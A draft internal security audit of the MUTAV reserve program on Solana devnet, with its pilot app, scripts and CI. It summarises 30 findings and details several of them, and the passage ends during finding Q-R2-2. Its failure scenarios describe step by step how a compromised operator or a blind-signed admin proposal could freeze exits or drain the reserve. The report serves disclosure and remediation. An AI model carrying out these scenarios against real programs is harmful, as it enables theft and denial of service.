# MUTAV reserve program: internal security audit #2

*Review date: 2026-10-29 (live checks of reserve.mutav.finance on 2026-10-30 00:34 UTC). Commits reviewed: program and client [`46ca747`](https://github.com/mutav-finance/mutav-protocol-solana/commit/46ca747) (audit #1) to [`833c114`](https://github.com/mutav-finance/mutav-protocol-solana/commit/833c114) (deployed as `v1.0.0-devnet`, unchanged at `893f3a9`); app, scripts and CI `46ca747` to [`893f3a9`](https://github.com/mutav-finance/mutav-protocol-solana/commit/893f3a9) (`main`). Reviewed by the MUTAV team with AI-assisted adversarial review. This is an internal review, not an independent audit.*

**Status: draft.** Findings are under review and their fixes are pending. Every finding is Open until its fix PR lands.

## Contents

1. [Overview](#1-overview)
2. [Severity definitions](#2-severity-definitions)
3. [Summary of findings](#3-summary-of-findings)
4. [Detailed findings](#4-detailed-findings)
5. [Design decisions taken during the review](#5-design-decisions-taken-during-the-review)
6. [Confirmed-sound properties](#6-confirmed-sound-properties)
7. [OWASP Smart Contract Top 10 (2026): changes since the last review](#7-owasp-smart-contract-top-10-2026-changes-since-the-last-review)
8. [Deferred items and residual risks](#8-deferred-items-and-residual-risks)

---

## 1. Overview

### 1.1 Purpose

Audit #1 (2026-10-11) reviewed the Wave 1 code at `46ca747` before the devnet deploy. This audit reviews what changed after it and what is now live:

- the program that runs on devnet as `GhPkq95RkY7PrJLsv74X73s6ozcwf6JqJtjFouqQeZbV` (release `v1.0.0-devnet`, commit `833c114`), including the size and refactor PRs that landed after audit #1;
- the pilot app at reserve.mutav.finance, the deploy and release scripts, and CI, as they stand on `main` at `893f3a9`.

It had three goals:

- find security and economic faults in the deployed program;
- prove that the mechanical refactors after audit #1 changed no behaviour;
- test the signing paths against two incidents of 2026-10-29: Binance (one valid hot-wallet signature carried full authority) and Polymarket (a compromised third-party script hijacked logged-in sessions and drove the signer).

### 1.2 Scope

| Component | Path | Range | Files changed | Notes |
|---|---|---|---|---|
| Program | `programs/mutav` | `46ca747..833c114` | 39 | #50 rename, #53 `approve_claim`, #54 and #58 parking fixes, #60 build profile, #61 dedupes. `git diff 833c114 893f3a9 -- programs/` is empty, so `main` holds the deployed source. |
| Client | `clients/js` | `46ca747..833c114` | 24 | Codama-generated client and hand-written reads. Program and client together: 63 files, +2,394 / −768 lines. |
| Pilot app | `app/` | `46ca747..893f3a9` | 175 | Server routes, proposal composers and decoder, wallet provider, `/admin`, security headers, simulator. |
| Scripts | `scripts/` | `46ca747..893f3a9` | 20 | `scripts/devnet`, `scripts/release`, `scripts/check-no-keys.sh`. |
| CI | `.github/workflows` | `46ca747..893f3a9` | 3 | `ci.yml`, `release.yml`, `fork.yml`. App, scripts and CI together: 198 files, +12,183 / −2,823 lines. |
| Deploy records | `deployments/` | `46ca747..893f3a9` | 2 | Read as the record of the live deploy. |

52 commits are in `46ca747..893f3a9`. Script and CI changes came from #51, #60, #61, #67, #68 and #100.

Out of scope:

- third-party programs (Squads v4, the BRS issuer's mint program), except where the reserve integrates with them;
- open issues that already track a finding: #21, #30, #55, #56, #91 (the real deploy under the declared ID) and #99 (devnet Squads time locks). They are not re-reported;
- the out-of-repo devnet harness, which was read for context only (addresses and scripts; no key file was opened).

### 1.3 Method

1. **Four parallel read-only finders**, one per area:
   - **R1, program logic:** the claim path, roles, pause and caps, under a compromised operator key and a compromised admin signer or quorum;
   - **R2, refactor equivalence:** #50, #60 and #61 against the code they replaced, and the fixes #53, #54 and #58, read against the Anchor 1.2.0 macro source;
   - **R3, app server and signing:** the server routes, the proposal decoder, the wallet path and the live response headers;
   - **R4, scripts, CI, supply chain and verifiability:** the release pipeline, toolchain and dependency pins, and whether the deployed bytes can be reproduced.
2. **Threat model.** Every finder asked two questions taken from the incidents above. Where does one valid signature carry more authority than the person signing can see? Where can code on a page or in a pipeline swap what gets signed?
3. **Main-session verification.** Every Medium finding was re-checked against the source at `893f3a9`. Headers were checked live. Each finding carries a mark:
   - ✅ reproduced by reading the source or the live response;
   - ◐ plausible, not reproduced in the main session.
4. **Deduplication.** Overlapping findings were merged. AV-R2-1 and AV-R1-4 are one finding (AV-R1-4). NEW-R2-3 is merged into Q-R2-2.

### 1.4 Limitations

- **This is an internal review, not an independent audit.** The reviewers had full access to the team's design intent, which can hide assumptions an outside auditor would question.
- **No tests or builds were run.** Nothing was built, deployed or sent to any cluster. Every finding comes from reading source, documents and live responses. The ◐ findings, and every proposed fix, need a LiteSVM test in their fix PR.
- No fuzzing, property-based invariant testing or formal verification was done.
- **GitHub settings were not readable:** rulesets, branch and tag protection, environments, required reviewers and secret scoping. S12 lists what to check.
- **The Vercel firewall and project settings were not readable** (the connector returned 403 for team `mutav`). The WAF status in A-R3-5 comes from the repository only. A rate-limit test against production was not run, on purpose.
- The deployed bytes cannot be reproduced by a third party (S13). That the live program is `833c114` rests on the executable hash the deployer recorded in `deployments/devnet.json`.

### 1.5 Result in one paragraph

The refactors after audit #1 are behaviour-equivalent, and no Critical or High fault was found. A compromised operator key still moves at most one window's headroom of `max_claim_per_period` (R$20k on the pilot), and only into the payments account. The main faults are elsewhere. The registry damage a compromised operator can do in the deployed binary is larger than documented: about 48 fake filings in under a minute push the reserve under required coverage and freeze exits, and revoking the operator undoes none of it (NEW-R1-1). The documented R$20k bound also stops holding in two places: while the period cap is raised for an approved claim (F-R1-2), and after one malicious protocol-admin proposal, because the program enforces no delay of its own (NEW-R1-3). On the signing side, admin members can only read a proposal through the same web origin that builds the bytes they sign (NEW-R3-1), Squads config changes can be approved in the app without their arguments (NEW-R3-2), and no signer-side tool checks an upgrade proposal against a locally reproduced build (S9).

### 1.6 Status of earlier findings

- **Pre-devnet AV-1** (`close_guarantee` ignores the close reason rules). **Partly fixed.** `close_guarantee(id, reason)` with the VOID and RELEASED rules is in the binary, and R1 confirmed it sound. The recovery half of the resolution, `reinstate_guarantee`, is **deferred** to the first upgrade ([known limitations](../security/known-limitations.md)). A close is final in the deployed binary.
- **Pre-devnet AV-2** (no way to withdraw a mistaken or malicious filing). **Deferred.** Neither `withdraw_claim` nor its successor `amend_claim(0)` is in the binary; status `WITHDRAWN` is reserved and refused. The deferral is documented in known limitations. Its impact is understated there (NEW-R1-1).
- **Audit #1 row in [Reviews and audits](../security/reviews-and-audits.md).** It said "Every confirmed finding is fixed (#51, #52, #54, #58)". As a description of the protocol's state, that is not accurate:
  - the reversals that resolve AV-1 and AV-2 were deferred, not fixed;
  - issues #55 and #56 are still open;
  - CSP enforcement and the WAF rule are still deferred (A-R3-1, A-R3-5).

  Audit #1 has no standalone report, so this audit could not check its own finding list item by item. The row is corrected in this PR, and the same claim in the litepaper and the pilot paper is listed for correction in the PR description.

---

## 2. Severity definitions

| Severity | Meaning |
|---|---|
| **Critical** | Direct loss or permanent lock of reserve assets by an unprivileged party, with no precondition. None found. |
| **High** | Loss of reserve assets or an irreversible operational fault reachable through a normal path or a single compromised hot key, or a fault that would force a per-account migration after the layout freeze. None found. |
| **Medium** | A broken invariant, a bypass of a cap or guard, a denial of service on a core flow, or a loss that needs an unusual but realistic condition. |
| **Low** | Defence in depth, a missing bound, an edge case with limited impact, or an operational hazard with a known workaround. |
| **Informational** | Documentation, test coverage, events or code quality, with no direct security impact. |

Where a finder and the main-session verification disagreed, the verification's rating is used. S10 was rated Medium by its finder and is Low here, because the deploy it concerns is a disposable test deploy with no real money.

---

## 3. Summary of findings

30 findings: **0 Critical, 0 High, 6 Medium, 15 Low, 9 Informational.**

Status for every finding is **Open** and the decision is **Pending Julia** unless marked otherwise. No accepted ADR covers any of the proposed fixes. A fix that changes who can move funds, what is gated or what the caps mean needs a new ADR and a spec update in the same PR, as the repository rules require.

| ID | Title | Severity | Component | Resolution | Status | Decision |
|---|---|---|---|---|---|---|
| NEW-R1-1 | Fake filings freeze exits and new guarantees in the deployed binary; the documented impact understates it | Medium ◐ | Program, docs | Proposed: correct the docs and the incident runbook; interim `caps.max_open_provisions`; ship `amend_claim` and `reinstate_guarantee` before outside capital; fix the reinstate age check | Open | Pending Julia |
| F-R1-2 | Raising the period cap for an approved claim also raises the room for unapproved payments | Medium ✅ | Program | Proposed: `caps.max_unapproved_per_period` (ADR) | Open | Pending Julia |
| NEW-R1-3 | No on-chain delay or veto on risk-increasing admin actions; `propose_admin` accepts any key | Medium ◐ | Program | Proposed: pending changes with a program-floored delay, a guardian veto, a Squads-vault check on `propose_admin` (ADR) | Open | Pending Julia |
| S9 | No signer-side check of an upgrade proposal against a locally reproduced build | Medium ✅ | Scripts, runbook | Proposed: `scripts/release/check-upgrade.ts`; a hard step in spec §14.5 | Open | Pending Julia |
| NEW-R3-1 | Admin members can only read a proposal through the origin that builds the bytes they sign | Medium ✅ | App, runbook | Proposed: an out-of-browser proposal check; approve from a second frontend; an out-of-band proposal watcher | Open | Pending Julia |
| NEW-R3-2 | Squads config changes are offered for Approve and Execute without their arguments | Medium ✅ | App | Proposed: decode every `ConfigAction`; refuse Approve and Execute in the app or require a typed confirmation | Open | Pending Julia |
| AV-R1-4 | Payments-account rules are checked only at install; `pay_claim` checks the address only (also AV-R2-1) | Low ✅ | Program | Proposed: re-check owner, delegate and close authority in `pay_claim` | Open | Pending Julia |
| NEW-R1-5 | Guardians and `pause` cannot contain an operator compromise | Low ◐ | Program | Proposed: guardians may call `revoke_operator`, or a guardian-set registry freeze bit (ADR) | Open | Pending Julia |
| F-R1-6 | No booking path returns a mistaken or fraudulent claim payment | Low ◐ | Program | Proposed: `return_claim_payment` in Wave 2 (ADR); runbook entry now | Open | Pending Julia |
| E-R1-7 | A compromised operator can stamp false settlement hashes for good | Low ◐ | Program | Proposed: re-settlement with a revision and an event; runbook re-check | Open | Pending Julia |
| S10 | The live devnet test multisigs have four harness-generated member keys on one machine | Low ✅ | Deploy | Proposed: record members and custody in `deployments/devnet.json`; never carry into #91 | Open | Pending Julia (with #91, #99) |
| A-R3-1 | The CSP is report-only, and served scripts carry no nonce, so it cannot be enforced as written | Low ✅ | App | Proposed: fix the nonce path, add a nonce test and reporting, then enforce | Open | Pending Julia |
| A-R3-2 | Anyone can block the `set_config` stale-carry lookup by touching future transaction PDAs | Low ◐ | App | Proposed: an on-chain `config_revision` check; interim scan from the proposal's creation slot | Open | Pending Julia |
| A-R3-3 | Risky admin arguments are folded behind "Details" and not flagged | Low ◐ | App | Proposed: always show `set_config` diffs and role keys; flag cap loosening and unexpected keys | Open | Pending Julia |
| A-R3-4 | On-chain refs can be linked to leases | Low ◐ | App | Proposed: salted or random guarantee ids and refs; mark the localStorage store demo-only | Open | Pending Julia |
| S11 | The release workflow stages any ref, re-resolves it per job and interpolates it into shell | Low ◐ | CI | Proposed: pass `ref` through `env:`, resolve once to a signed `v*` tag on `main` | Open | Pending Julia |
| S12 | Release assets, including the `idl-compat` baseline, can be overwritten; repository settings are not codified | Low ◐ | CI | Proposed: no `--clobber`, immutable releases, tag ruleset, pinned baseline, `CODEOWNERS` | Open | Pending Julia |
| S13 | No third party can reproduce the deployed devnet bytes; the release pipeline cannot upgrade the live program | Low ◐ | Scripts, CI | Proposed: a verified build under `GhPkq95…`, or state non-reproducibility until #91 | Open | Pending Julia (with #91) |
| S14 | `upgrade-proposal.ts` does not check that the buffer declares the target program ID | Low ◐ | Scripts | Proposed: refuse a buffer without the program ID bytes; fork rehearsal | Open | Pending Julia |
| S15 | Toolchains are fetched without integrity pins | Low ◐ | CI | Proposed: checksummed Solana release, `anchor-cli --rev`, pinned Surfpool | Open | Pending Julia |
| S16 | The buffer payer key sits on disk while `bun` and `node_modules` code run | Low ◐ | CI | Proposed: write and remove the key inside the buffer step only | Open | Pending Julia |
| Info-R1-8 | Dust filings make guarantees impossible to close and amplify cleanup | Informational ◐ | Program | Proposed: a minimum filing amount; batch `amend_claim` | Open | Pending Julia |
| Info-R1-9 | One admin signer can veto everything; one blind-signed proposal is a full compromise | Informational ◐ | Governance | Proposed: 2-of-3 with an independent key before outside capital; no blind signing | Open | Pending Julia |
| Q-R2-2 | Compute-unit limits are static, and the Squads execute limit is a convention (also NEW-R2-3) | Informational ◐ | App, scripts | Proposed: simulate and set limits; name the execute path in the runbook | Open | Pending Julia |
| NEW-R2-4 | One documented error-code divergence in `initialize` | Informational ◐ | Program | None needed; keep the LiteSVM cases | Acknowledged | None needed |
| A-R3-5 | Status of pre-devnet A2: the WAF rate limit is still only staged | Informational ◐ | App, ops | Proposed: apply the staged rules; a keyed RPC provider before the pilot | Open | Pending Julia |
| A-R3-6 | The static simulator shares the admin signing origin | Informational ◐ | App | Proposed: another origin or a sandboxed iframe | Open | Pending Julia |
| A-R3-7 | Stale comment about wallet persistence | Informational ◐ | App | Proposed: correct the comment | Open | Pending Julia |
| S17 | Gaps in dependency supply-chain hygiene | Informational ◐ | CI | Proposed: `cargo deny`, `bun audit`, lockfile drift check, `vercel.json` install command | Open | Pending Julia |
| S18 | `check-no-keys.sh` misses `tests-fork/`, inline workflow code and some read APIs | Informational ◐ | Scripts, CI | Proposed: extend the scan | Open | Pending Julia |

---

## 4. Detailed findings

Locations refer to `893f3a9`. Program paths are relative to `programs/mutav/src/`; app paths to `app/`. Values are the pilot parameters of [ADR 0028](../decisions/0028-pilot-parameters.md), which are also the values in `deployments/devnet.json`: c = 0.25, `max_claim_per_call` R$15k, `max_claim_per_period` R$20k per 31 UTC days, `max_cover_per_guarantee` R$120k, `stress_buffer` R$19k, `max_tvl` R$1M. Scenarios that need a book use the ADR 0028 plan at month 6: 97 leases at R$39,600 of cover each (R$26.4k default leg, R$13.2k exit leg), about R$3.84M of cover against about R$1M of BRS. Time locks: 60 s (admin) and 120 s (upgrade) on the test deploy; 24 h and 7 days planned for the real pilot.

### 4.1 Program

#### NEW-R1-1. Fake filings freeze exits and new guarantees in the deployed binary; the documented impact understates it

- **Severity:** Medium ◐. A denial of service on core flows, reached through a single compromised hot key. Not High, because money out stays cap-bounded and a slow on-chain workaround exists. It becomes High if that workaround is ruled out in operation.
- **Location:**
  - `instructions/operator/file_claim.rs:56-97` (no cap, no pause gate, no mode gate; no counterpart instruction);
  - `instructions/operator/close_guarantee.rs:52-92` (no `reinstate_guarantee`);
  - `coverage.rs:35` (`coverage_required` includes provisions), `coverage.rs:94` (`net_assets = brs − provisions`);
  - `instructions/capital/fulfil_redeems.rs:130` (`UnderCovered`), `instructions/operator/register_guarantee.rs:75-79`, `instructions/capital/mod.rs:99` (`ReserveUnderwater`);
  - `docs/security/known-limitations.md:22-23` (the deferral) and `:34` (the understated impact);
  - `docs/security/invariants.md:58` (invariant 21), `docs/security/incident-response.md:47` (step 4, "Correct").
- **Description:**
  - The deferral of `amend_claim` and `reinstate_guarantee` to the first upgrade is documented and accepted ([known limitations](../security/known-limitations.md), rows "Claim amendment and withdrawal" and "Guarantee reinstatement"). The missing instructions are not this finding.
  - This finding is that the documented impact is too small. Known limitations, invariant 21 and the incident runbook say that until Wave 2 "a fake filing stays provisioned and unpaid". In the deployed binary a fake filing does much more:
    - provisions enter `coverage_required = max(c × remaining_cover, provisions + min(stress_buffer, unprovisioned_cover))` and leave `net_assets`;
    - so fake filings lower NAV, which breaks the `nav_bounds` of every fill proposal already queued;
    - enough of them push the reserve under required coverage: `fulfil_redeems` refuses (`UnderCovered`) and `register_guarantee` refuses;
    - past `brs_balance` the reserve is underwater, and both fills refuse (`ReserveUnderwater`);
    - fake filings on real guarantees use up those legs' unprovisioned cover, so the real claims on those leases cannot be filed (`ExceedsRemainingCover`);
    - a fake close of a real lease is final: it can take no claim afterwards.
  - Revoking the operator stops further damage and undoes none of it.
  - ADR 0020 bounds an operator compromise at the claim caps *because* every other operator action is reversible. In the deployed binary that premise does not hold, and the docs do not say what it costs.
- **Impact:**
  - Investor exits and new guarantees stop for every holder, until a program upgrade (7-day upgrade time lock on the pilot) or a slow workaround.
  - NAV on `/reserve` drops by the fake provisions.
  - When the filings are later withdrawn, NAV jumps back. Anyone whose deposit was filled at the depressed NAV gains that value: the pre-devnet NEW-A in a new form.
  - The runbook's "Correct" step has no instruction to use.
- **Failure scenario (pilot, month 6):**
  1. `coverage_required` is `max(0.25 × R$3.84M, provisions + R$19k)`, about R$960k, against R$1M of BRS.
  2. The attacker files the full cover of two real guarantees (four `file_claim` calls, R$79.2k). It takes under 10 seconds. NAV per share drops about 7.9%, and every queued fill proposal fails `NavOutOfBounds`; each re-proposal waits another 24 h.
  3. The attacker keeps going until 24 guarantees are filed in full: 48 `file_claim` calls in about 6 to 8 transactions, under a minute, R$950.4k of provisions. `provisions + R$19k` (R$969.4k) is now above `c × cover` (R$960k). Redemption fills and new guarantees refuse.
  4. Two more default-leg filings (R$52.8k) take provisions past `brs_balance`. The reserve is underwater, and both fills refuse.
  5. The pauser revokes the operator within 5 minutes. Nothing changes on chain.
  6. The only on-chain way back: the protocol admin raises `max_claim_per_period` and approves each filing above R$15k (each a time-locked proposal); a new operator pays each fake filing to the payments account; MUTAV returns the BRS through the income inbox and `sweep_income`, which books it as issuer income. Every payment also raises `*_paid` on a real lease for good. Recovering R$1M this way takes days of proposals and leaves the accounts misbooked (see F-R1-6).
- **Resolution (proposed):**
  1. **Correct the docs now.** Known limitations line 34, invariant 21 and incident-response step 4 say that until Wave 2 a fake filing lowers NAV, can push the reserve under required coverage and underwater, freezes redemption and deposit fills and new guarantees, and is not undone by revoking the operator. The corrected known-limitations row is in this PR.
  2. **Interim bound in the current binary**, a small upgrade with no layout change beyond `Caps._reserved` (32 bytes): add `caps.max_open_provisions` (u64). `file_claim` refuses when `state.provisions + amount > max_open_provisions` (for example R$40k, about two pilot claims). A legitimate claim above it waits for a raise or is paid bank-first, which ADR 0021 already allows. Optionally a `caps.max_closes_per_day` counter. This changes what is gated, so it needs an ADR.
  3. **Ship `amend_claim` (with the #56 revision rules) and `reinstate_guarantee` before any capital other than MUTAV's own.** Add "invariant 21 holds in the binary" as an explicit gate item in `docs/security/baseline.md`.
  4. **Fix the reinstate age check for closes made before the upgrade.** `reinstate_guarantee` checks `now − closed_at ≤ max_reinstate_age`. A close made more than `max_reinstate_age` before the upgrade could never be reinstated. Measure the age from `max(closed_at, reinstate_enabled_at)` (a carved config field set by the upgrade's first `set_config`), or have the upgrade proposal set the age to cover the gap.
- **Reference:** ADR 0020, ADR 0021; pre-devnet AV-1, AV-2, NEW-A; spec §5.4.

#### F-R1-2. Raising the period cap for an approved claim also raises the room for unapproved payments

- **Severity:** Medium ✅. A cap bypass under the workflow the ADR itself prescribes. It breaks the "R$20k per 31 days" bound stated in ADR 0028 and invariant 21.
- **Location:** `instructions/operator/pay_claim.rs:143-147` (one window check for every payment, line 145); `instructions/operator/pay_claim.rs:129-135` (the approval only matters above the per-call cap); `instructions/admin/approve_claim.rs:52-76`; ADR 0021 decision 2.
- **Description:**
  - `pay_claim` checks `claim_window_paid() + amount ≤ max_claim_per_period` for approved and unapproved payments alike.
  - ADR 0021 tells the protocol admin to raise `max_claim_per_period` in the same proposal as a large `approve_claim`, and lower it later with another proposal.
  - The raise applies to every payment. While it lasts, unapproved payments up to `max_claim_per_call` each can use the extra room.
- **Impact:** for as long as the raise lasts (at least one more 24 h time lock on the pilot), a compromised operator can pay out up to the raised cap, not R$20k. It can also spend the room first, so the approved legitimate claim then fails.
- **Failure scenario:**
  1. The window holds R$5k of payments. A legitimate R$45k eviction claim is approved, and the same proposal raises `max_claim_per_period` to R$50k.
  2. After it executes, and before the honest operator pays, a compromised operator files and pays three fake R$15k claims. Each is at the per-call cap and needs no approval.
  3. The window now holds R$50k. The approved R$45k claim fails with `ClaimPeriodCapExceeded`.
  4. R$45k has left in the window, against the documented R$20k. The cap stays raised until the next proposal executes.
- **Resolution (proposed):** add `caps.max_unapproved_per_period` (u64, carved from `Caps._reserved`; 0 means equal to `max_claim_per_period`). When a payment uses no approval (`amount ≤ max_claim_per_call`), `pay_claim` also requires `claim_window_paid() + amount ≤ max_unapproved_per_period`. Every payment still counts in the same buckets and against `max_claim_per_period`, so ADR 0021's rule that approved payments count is kept. The protocol admin then raises only `max_claim_per_period` for a large approved claim. A LiteSVM test: a raised cap plus unapproved payments stays at or below the unapproved cap. This changes what a cap means, so it needs an ADR amending ADR 0021 and a spec §8 update.
- **Reference:** ADR 0021, ADR 0028; invariants 20 and 21.

#### NEW-R1-3. No on-chain delay or veto on risk-increasing admin actions; `propose_admin` accepts any key

- **Severity:** Medium ◐. A design gap. The precondition is a compromised admin quorum, or one disguised proposal that both members sign (with blind signing on, a Ledger shows only a hash).
- **Location:**
  - every admin handler checks only `config.admin == signer`, for example `instructions/admin/set_payments_account.rs:24`, `instructions/admin/roles.rs:111`, `instructions/admin/approve_claim.rs:30`, `instructions/admin/set_config.rs`;
  - `instructions/admin/roles.rs:57-71, 76-95`: no minimum delay between `propose_*` and `accept_*`;
  - `instructions/admin/mod.rs:56-69`: `validate_role_key` accepts any non-default, distinct key as the next admin;
  - Squads members, threshold and time lock are checked only by `scripts/devnet/lib/squads.ts`, at deploy and verify time.
- **Description:**
  - The program has no time lock of its own. A new payments account, an operator appointment, a cap raise or an admin handover takes effect when the Squads vault transaction executes, and `accept_role` or `accept_admin` can follow in the next slot.
  - Nothing on chain can stop a queued malicious proposal: guardians and the pauser can only `pause`, and `pay_claim` ignores the pause; `revoke_operator` does not stop a proposal that installs a new operator; a Squads cancel needs the threshold; holders cannot leave during the time lock, because fills are admin-only and the exit fallback is not built.
  - `propose_admin` to a plain wallet, then `accept_admin`, removes the time lock for good with one proposal.
- **Impact:** one malicious proposal, once its time lock passes, can drain the reserve's whole `brs_balance` within minutes. The time lock buys detection time, but nothing on chain can act on what is detected. The escrows (`pending_deposits`, `pending_redemptions`, `claims`) stay out of reach.
- **Failure scenario:**
  1. A proposal described as "rotate operator plus routine caps update" is blind-signed by both members. It contains `cancel_pending(OPERATOR)`, `propose_role(OPERATOR, X)`, `set_config` with `max_claim_per_call = max_claim_per_period = 10^15`, and `set_payments_account(Y_ata)`.
  2. 24 h later it executes. X signs `accept_role` at once.
  3. X files and pays about 194 claims across the 97 leases. Cover (R$3.84M) is far above the balance, so the whole R$1M leaves for `Y_ata` in minutes. Y is not X, so the owner rules pass.
  4. The guardian bot saw the `ConfigUpdated` events 24 h earlier and could only `pause`, which does not touch claims.
- **Resolution (proposed):** risk-increasing changes are delayed on chain; risk-reducing ones stay immediate, in line with the emergency path of ADR 0027.
  1. Carve `pending_payments_account`, a pending caps raise (or a hash of the pending caps input) and `activates_at` from `VaultConfig._reserved` (411 bytes). `set_payments_account`, and any `set_config` that raises `max_claim_per_call`, `max_claim_per_period`, `max_tvl` or `max_cover_per_guarantee`, record a pending change. A permissionless `activate_pending` applies it after `config_delay_secs`, admin-set and floored by a program constant (for example 24 h). Lowering a cap stays immediate.
  2. `accept_role(OPERATOR)` and `accept_admin` take effect only once `now ≥ proposed_at + config_delay_secs`.
  3. `cancel_pending_change`, signed by a guardian, the pauser or the protocol admin, clears any pending risk-increasing change or handover. A stolen guardian key then costs only a delay.
  4. `propose_admin` requires a Squads v4 vault: the multisig account is owned by the Squads v4 program, the vault PDA derives from it, `config_authority` is the default key, and `time_lock ≥ MIN_ADMIN_TIME_LOCK`. The time-lock floor becomes an on-chain property.
  5. Until then, document in `docs/security/governance-and-keys.md` that the time lock is a Squads property only and that a guardian's only lever is `pause`.

  Items 1 to 4 change who can move funds and when, so they need an ADR amending ADR 0020.
- **Reference:** ADR 0020, ADR 0027 (emergency path), ADR 0031 (Proposed); Info-R1-9; NEW-R3-1.

#### AV-R1-4. Payments-account rules are checked only at install; `pay_claim` checks the address only

Also reported by R2 as AV-R2-1.

- **Severity:** Low ✅. Defence in depth: exploiting it needs the payments wallet's own key.
- **Location:** `instructions/operator/pay_claim.rs:67-72` (address constraint only); `instructions/admin/mod.rs:176` (`load_money_account`), `:201-233`, `:293-318` (the rules run at install, at `accept_role` and at `set_config`).
- **Description:** the ADR 0020 rules for the payments account (not owned by the operator, the capital wallet or the vault authority; no delegate; no close authority; not frozen) are checked when the account is installed and when another money account or role changes. At pay time, `pay_claim` checks only `payments_account.key() == config.payments_account`. With classic SPL Token the owner can later run `SetAuthority(AccountOwner)`, `Approve` a delegate, or close the account at zero balance. Since #54, a closed current payments account is also read leniently by `accept_role`.
- **Impact:** the rule "the operator never controls where claims land" holds only at the moment of install. A compromised payments wallet, or a key estate shared with the operator, can redirect later claim payments. A closed payments account makes every `pay_claim` fail until a time-locked `set_payments_account` executes.
- **Failure scenario:**
  1. The payments wallet signs `SetAuthority(AccountOwner → X)` on `CVbQ…rKAj`.
  2. The compromised operator X files and pays fake claims up to R$20k into an account X now owns. The program sees nothing wrong.
  3. From then on `set_config` fails with `InvalidPaymentsAccount` until the account is replaced, so the protocol admin also loses `set_config` for a time lock.
- **Resolution (proposed):** in `pay_claim`, after the address check, require `payments_account.owner != config.operator` (or equal to a pinned `config.payments_owner` carved from `VaultConfig._reserved` and written by `set_payments_account` and `initialize`), `delegate.is_none()` and `close_authority.is_none()`, failing with `InvalidPaymentsAccount`. About 200 compute units and no interface change. A drift then stops payments (bank-first covers it) instead of redirecting them. Optionally re-check the treasury in `contribute_fees`. Keep the ADR 0020 owner-change watcher as the alert.
- **Reference:** ADR 0020; pre-devnet AV-3.

#### NEW-R1-5. Guardians and `pause` cannot contain an operator compromise

- **Severity:** Low ◐. Defence in depth: the immediate pauser path exists.
- **Location:** `state/config.rs:116-131` (`can_pause` admits guardians; `is_pauser_or_admin` does not); `instructions/admin/revoke_operator.rs:23`; `instructions/operator/pay_claim.rs:156`, `file_claim.rs:62`, `close_guarantee.rs:1-3` (not pause-gated).
- **Description:** `pause` stops none of `pay_claim`, `file_claim`, `close_guarantee`, `settle_payout`, `contribute_fees` or `sweep_income`. `revoke_operator` can be signed only by the pauser (one key) and the protocol admin (time-locked). The guardian slots, meant for a monitoring bot (ADR 0020 decision 7), have no action that slows an operator.
- **Impact:** if the pauser is unreachable, an operator compromise runs until an admin proposal clears its time lock (24 h on the pilot). The money bound inside one window does not change, but the NEW-R1-1 and E-R1-7 damage keeps growing, and an automated guardian cannot act at incident speed (the Binance drain took minutes).
- **Failure scenario:** at 03:00 BRT the guardian bot sees 40 `GuaranteeClosed` events in one minute. It calls `pause`; closes and filings continue. The pauser is a founder's hardware wallet, offline until morning.
- **Resolution (proposed):** let guardians call `revoke_operator` (`constraint = config.can_pause(&signer.key())`). It is risk-reducing and reversed by the normal re-appointment; the cost is the accepted AV-5 profile (a stolen guardian key can stop claims until re-appointment; bank-first covers it). Alternatively, a guardian-set `disabled_ops` bit (already carved) that stops `file_claim`, `close_guarantee` and `register_guarantee` but leaves `pay_claim` open. Either changes a role's power, so it needs an ADR amending ADR 0020.
- **Reference:** ADR 0008, ADR 0020; pre-devnet AV-5.

#### F-R1-6. No booking path returns a mistaken or fraudulent claim payment

- **Severity:** Low ◐.
- **Location:** `instructions/operator/pay_claim.rs:210-215` (the bucket and `claims_paid_total` only grow); `instructions/operator/contribute_fees.rs:93-109`; `instructions/operator/sweep_income.rs:126-167`.
- **Description:** after a compromise, MUTAV holds the fraudulent payments in its payments account and wants to make the reserve whole. Through `contribute_fees`, 20% goes to the treasury as the fee take (`fee_take_bps = 2000`). Through the income inbox and `sweep_income`, the return is booked as issuer income. Neither frees the window bucket.
- **Impact:** misstated income, fees and `claims_paid_total`; up to 31 days of reduced claim capacity, with legitimate claims pushed bank-first.
- **Failure scenario:** R$20k is paid fraudulently on day d. MUTAV returns it with `contribute_fees`: the reserve gets R$16k and the treasury R$4k. A legitimate R$12k claim on day d+3 fails with `ClaimPeriodCapExceeded` until day d+31, unless the period cap is raised, which opens F-R1-2.
- **Resolution (proposed):** a Wave 2 `return_claim_payment(notice_ref_hash, amount)`, signed by the payments-account owner, not the operator. It moves `amount ≤ filing.paid_amount` from the payments account to `reserve` with no take, adds to `brs_balance`, records a carved `returned_amount` on the filing, subtracts the amount from the bucket of the payment's day if that day is still in the window, and emits `ClaimPaymentReturned`. New instruction, so an ADR. Until then, a runbook entry: return through the inbox with a dedicated `income_ref_hash` prefix, and disclose it.
- **Reference:** ADR 0021, ADR 0024.

#### E-R1-7. A compromised operator can stamp false settlement hashes for good

- **Severity:** Low ◐. Record integrity; no money moves.
- **Location:** `instructions/operator/settle_payout.rs:47-55`; `state/claim.rs:29-31` (`SETTLED` is terminal).
- **Description:** any `PAID` filing can be moved to `SETTLED` once, with any non-zero `pix_e2e_hash`. No instruction corrects it.
- **Impact:** the public claims history, the attestation basis of ADR 0020 decision 10, carries false settlement evidence, and the real Pix end-to-end ID can never be recorded.
- **Failure scenario:** 12 claims paid in the last 48 h await Pix confirmation. The attacker sends 12 `settle_payout` calls with random hashes. The real IDs arrive the next morning and cannot be written.
- **Resolution (proposed):** allow re-settlement by the current operator with a carved `settlement_revision: u16` and a `PayoutResettled { old_hash, new_hash, revision }` event, or make the correction a protocol-admin action. Add to the incident runbook: settlements made in the compromise window are re-verified.
- **Reference:** ADR 0020 decision 10.

#### Info-R1-8. Dust filings make guarantees impossible to close and amplify cleanup

- **Severity:** Informational ◐. Cleanup is possible, so nothing is lost for good.
- **Location:** `instructions/operator/file_claim.rs:67, 79-82` (`amount > 0`, `open_claims: u16`); `instructions/operator/close_guarantee.rs:63`.
- **Description:** a compromised operator can file up to 65,535 one-unit claims per guarantee, at about 0.0035 SOL of rent each (paid by the attacker). `close_guarantee` then refuses with `OpenClaims` until every filing is paid, one transaction each.
- **Resolution (proposed):** a minimum filing amount (`amount ≥ max(1, min_request / 10)` or a carved `min_claim`); Wave 2's `amend_claim` accepts a batch of notices.

#### Q-R2-2. Compute-unit limits are static, and the Squads execute limit is a convention

Includes R2's NEW-R2-3.

- **Severity:** Informational ◐.
